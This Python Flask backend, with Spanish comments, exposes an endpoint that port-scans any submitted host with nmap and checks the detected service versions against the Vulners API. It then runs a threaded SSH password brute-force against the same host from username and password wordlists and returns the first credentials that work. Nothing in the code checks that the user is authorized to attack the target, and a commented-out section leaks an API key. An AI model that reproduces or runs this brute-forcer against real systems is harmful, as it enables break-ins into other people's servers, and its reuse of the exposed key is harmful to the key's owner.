from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
import nmap
import paramiko, sys, os, termcolor
import threading, time
import requests

app = Flask(__name__, static_folder='FrontEnd/static', template_folder='FrontEnd/templates')
CORS(app)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/status', methods=['GET'])
def status():
    return "Backend is running"

@app.route('/scan', methods=['POST'])
def handle_scan():
    data = request.json
    target = data.get('target')
    if not target:
        return jsonify({'error': 'No target provided'}), 400
    scan_result = scan(target)
    brute_force_result = start_brute_force(target)  # Llama a la función de fuerza bruta después del escaneo
    response = {
        'scan_result': scan_result,
        'brute_force_result': brute_force_result
    }
    return jsonify(response)


API_KEY = os.getenv("API_KEY")

def is_vulnerable(product, version):
    api_url = "https://vulners.com/api/v3/search/lucene/"
    headers = {
        'Content-Type': 'application/json',
        'X-Vulners-ApiKey': API_KEY
    }
    query = f"{product} {version}"
    data = {
        "query": query,
        "size": 1  # Limita el tamaño de la respuesta
    }

    try:
        response = requests.post(api_url, headers=headers, json=data)
        response.raise_for_status()  # Lanza un error si la respuesta HTTP es un error
        data = response.json()
        if data.get('data', {}).get('total', 0) > 0:
            vuln_data = data['data']['search'][0]
            title = vuln_data.get('title', 'No disponible')
            cvss_score = vuln_data.get('cvss', {}).get('score', 'No disponible')
            description = vuln_data.get('description', 'No disponible')
            references = vuln_data.get('href', 'No disponible')
            return True, {
                'title': title,
                'cvss_score': cvss_score,
                'description': description,
                'references': references
            }
        else:
            return False, {}
    except requests.exceptions.RequestException as e:
        print(f"Error al consultar la API de Vulners: {e}")
        return False, {}
    except ValueError as e:
        print(f"Error al decodificar la respuesta JSON: {e}")
        return False, {}

def scan(target):
    nm = nmap.PortScanner()
    nm.scan(hosts=target, arguments='-p 20,21,22,25,53,80,110,123,143,179,443,465,500,587,993,995,2222,3389,41648 -sV -sC')  # Escaneo de todos los puertos con detección de versiones
    scan_results = []
    vulnerabilities_found = False

    for host in nm.all_hosts():
        host_results = {
            'host': host,
            'protocols': []
        }
        for proto in nm[host].all_protocols():
            protocol_results = {
                'protocol': proto,
                'ports': []
            }
            ports = nm[host][proto].keys()
            for port in ports:
                product = nm[host][proto][port].get('product', '')
                version = nm[host][proto][port].get('version', '')
                port_result = {
                    'port': port,
                    'product': product,
                    'version': version,
                    'vulnerable': False,
                    'vul_data': {}
                }
                if product and version:
                    is_vuln, vul_data = is_vulnerable(product, version)
                    if is_vuln:
                        vulnerabilities_found = True
                        port_result['vulnerable'] = True
                        port_result['vul_data'] = vul_data
                protocol_results['ports'].append(port_result)
            host_results['protocols'].append(protocol_results)
        scan_results.append(host_results)

    return {
        'vulnerabilities_found': vulnerabilities_found,
        'results': scan_results
    }

    
# se empieza fuerza bruta    
def start_brute_force(target):
    stop_flag = False
    max_threads = 5  # Número máximo de hilos simultáneos
    thread_limiter = threading.BoundedSemaphore(max_threads)
    brute_force_results = []

    def ssh_connect(username, password):
        nonlocal stop_flag
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(target, port=22, username=username, password=password)
            stop_flag = True
            result = {'username': username, 'password': password, 'status': 'success'}
            print(termcolor.colored(('[+] Found Password: ' + password + ', For User: ' + username), 'green'))
        except paramiko.ssh_exception.AuthenticationException:
            result = {'username': username, 'password': password, 'status': 'failure'}
            print(termcolor.colored(('[-] Incorrect Password: ' + password + ', For User: ' + username), 'red'))
        except paramiko.ssh_exception.SSHException as e:
            result = {'username': username, 'password': password, 'status': 'ssh_exception', 'error': str(e)}
            print(termcolor.colored(('[-] SSH Exception: ' + str(e)), 'red'))
        except Exception as e:
            result = {'username': username, 'password': password, 'status': 'connection_failed', 'error': str(e)}
            print(termcolor.colored(('[-] Connection Failed: ' + str(e)), 'red'))
        finally:
            brute_force_results.append(result)
            ssh.close()
            thread_limiter.release()

    usernames_file = "usernamesReal.txt"
    passwords_file = "passwordsReal.txt"
    print('\n')

    if not os.path.exists(passwords_file):
        print('[!!] That File/Path Doesn\'t Exist')
        sys.exit(1)

    print('Empezando fuerza bruta en host ' + target) 

    with open(usernames_file, 'r') as users:
        for username in users:
            username = username.strip()
            with open(passwords_file, 'r') as passwords:
                for password in passwords:
                    password = password.strip()
                    if stop_flag:
                        break
                    thread_limiter.acquire()
                    t = threading.Thread(target=ssh_connect, args=(username, password))
                    t.start()
                    time.sleep(0.5)
                    if stop_flag:
                        break
            if stop_flag:
                break

    return brute_force_results

if __name__ == '__main__':
    app.run(debug=True)

# funciona bien de hoy
"""
#API_KEY = 'UQDQBWYICBHJA5UVHZCYUABANRUUM7LZNQXBIOB1P22TNNWJP0FIW8BWW14YRR4T'
API_KEY = os.getenv("API_KEY")

def is_vulnerable(product, version):
    api_url = "https://vulners.com/api/v3/search/lucene/"
    headers = {
        'Content-Type': 'application/json',
        'X-Vulners-ApiKey': API_KEY
    }
    query = f"{product} {version}"
    data = {
        "query": query,
        "size": 1  # Limita el tamaño de la respuesta
    }
    
    try:
        response = requests.post(api_url, headers=headers, json=data)
        response.raise_for_status()  # Lanza un error si la respuesta HTTP es un error
        data = response.json()
        if data.get('data', {}).get('total', 0) > 0:
            vuln_data = data['data']['search'][0]
            title = vuln_data.get('title', 'No disponible')
            cvss_score = vuln_data.get('cvss', {}).get('score', 'No disponible')
            description = vuln_data.get('description', 'No disponible')
            references = vuln_data.get('href', 'No disponible')
            return True, {
                'title': title,
                'cvss_score': cvss_score,
                'description': description,
                'references': references
            }
        else:
            return False, {}
    except requests.exceptions.RequestException as e:
        print(f"Error al consultar la API de Vulners: {e}")
        return False, {}
    except ValueError as e:
        print(f"Error al decodificar la respuesta JSON: {e}")
        return False, {}

def scan(target):
    nm = nmap.PortScanner()
    nm.scan(hosts=target, arguments='-p 20,21,22,25,53,80,110,123,143,179,443,465,500,587,993,995,2222,3389,41648 -sV -sC')  # Escaneo de todos los puertos con detección de versiones
    vulnerabilities_found = False
    
    for host in nm.all_hosts():
        print('\n' + 'Escaneando el objetivo ' + str(host))
        for proto in nm[host].all_protocols():
            print('Protocolo : %s' % proto)
            ports = nm[host][proto].keys()
            for port in ports:
                product = nm[host][proto][port].get('product', '')
                version = nm[host][proto][port].get('version', '')
                if product and version:
                    product_version = f"{product} {version}"
                    print('[+] El puerto abierto ' + str(port) + ' esta corriendo el servicio ' + product_version)
                    is_vuln, vul_data = is_vulnerable(product, version)
                    if is_vuln:
                        vulnerabilities_found = True
                        print(termcolor.colored(f'Se recomienda actualizar version: "{product_version}" en puerto: {str(port)}', 'red'))
                        print('Detalles de la vulnerabilidad:')
                        print(f"  Título: {vul_data.get('title', 'No disponible')}")
                        print(f"  CVSS Score: {vul_data.get('cvss_score', 'No disponible')}")
                        print(f"  Descripción: {vul_data.get('description', 'No disponible')}")
                        print(f"  Referencias: {vul_data.get('references', 'No disponible')}\n")
                        
    if not vulnerabilities_found:
        print(termcolor.colored("¡Felicitaciones, no se han encontrado versiones vulnerables en su sistema!", "green"))
           
targets = input('Escriba el dominio o ip a escanear: ')
if ',' in targets:
    for ip_add in targets.split(','):
        scan(ip_add.strip(' '))
else:
    scan(targets)
"""
# escaneo de puertos en base a txt
"""

def scan(target):
    nm = nmap.PortScanner()
    nm.scan(hosts=target, arguments='-p 20,21,22,25,53,80,110,123,143,179,443,465,500,587,993,995,2222,3389,41648 -sV -sC')  # Escaneo de todos los puertos con detección de versiones
    
    with open('vulbanners.txt', 'r') as file:
        #vul_banners = file.read().splitlines()
        vul_banners = [line.strip() for line in file.readlines()]
    
    for host in nm.all_hosts():
        print('\n' + 'Escaneando el objetivo ' + str(host))
        for proto in nm[host].all_protocols():
            print('Protocolo : %s' % proto)
            ports = nm[host][proto].keys()
            for port in ports:
                product_version = nm[host][proto][port]['product'] + ' ' + nm[host][proto][port]['version']
                print('[+] Puerto abierto ' + str(port) + ' : ' + product_version)
                if product_version in vul_banners:
                    print(termcolor.colored(('[!!] VULNERABLE BANNER: "' + product_version + '" ON PORT: ' + str(port)),'red'))
                    
targets = input('Escriba el dominio o ip a escanear: ')
if ',' in targets:
    for ip_add in targets.split(','):
        scan(ip_add.strip(' '))
else:
    scan(targets)
"""

